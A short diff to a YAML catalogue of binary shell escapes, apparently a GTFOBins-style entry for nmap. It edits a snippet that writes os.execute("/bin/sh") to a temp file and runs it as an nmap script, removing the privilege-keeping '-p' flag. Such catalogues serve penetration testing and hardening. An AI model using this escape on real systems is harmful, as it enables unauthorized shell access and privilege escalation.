@@ -86,6 +86,6 @@ functions:
     - description: Input echo is disabled.
       code: |
         TF=$(mktemp)
-        echo 'os.execute("/bin/sh -p")' > $TF
+        echo 'os.execute("/bin/sh")' > $TF
         ./nmap --script=$TF
 ---
